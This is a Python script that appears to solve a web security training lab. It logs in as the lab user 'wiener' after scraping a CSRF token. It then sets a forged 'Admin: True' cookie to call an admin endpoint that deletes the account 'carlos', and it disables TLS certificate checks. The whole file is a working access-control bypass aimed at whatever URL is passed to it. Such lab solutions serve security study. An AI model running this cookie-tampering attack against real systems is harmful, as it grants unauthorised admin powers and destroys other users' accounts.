import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import os
from pwn import log, success, error, warning
from colorama import Fore, Style, init

# Initialize colorama for color styling
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def clear_terminal():
    # Detect the operating system
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # macOS, Linux, etc.
        os.system('clear')


def get_csrf_token(session, url):
    log.info("Fetching CSRF token...")
    r = session.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    success(f"CSRF token retrieved: {csrf_token}")
    return csrf_token


def delete_user(session, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(session, login_url)

    # Login data payload
    data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }

    
    log.info("Attempting login...")
    r = session.post(login_url, data=data, verify=False)

    if "Log out" in r.text:
        success("Logged in successfully as 'wiener'.")
        cookie = r.cookies.get_dict().get('session')
        delete_carlos_url = url + "/admin/delete?username=carlos"
        cookies = {
            'session': cookie,
            'Admin': "True"
        }
        warning("Attempting to delete 'carlos' user account...")
        r = requests.get(delete_carlos_url, cookies=cookies, verify=False)

        if r.status_code == 200:
            success("Carlos account deleted successfully!")
        else:
            error("Failed to delete Carlos account.")
    else:
        error("Login failed. Check credentials or CSRF token.")


def main():
    clear_terminal()
    if len(sys.argv) != 2:
        log.failure(f"Usage: {sys.argv[0]} <url>")
        log.info(f"Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    log.info("Checking if the target is accessible...")
    r = requests.get(url)

    if r.status_code == 200:
        success("Target verified and accessible.")
    else:
        error("Target is down. Check the URL or connectivity.")
        sys.exit(-1)

    session = requests.Session()
    delete_user(session, url)


if __name__ == "__main__":
    main()
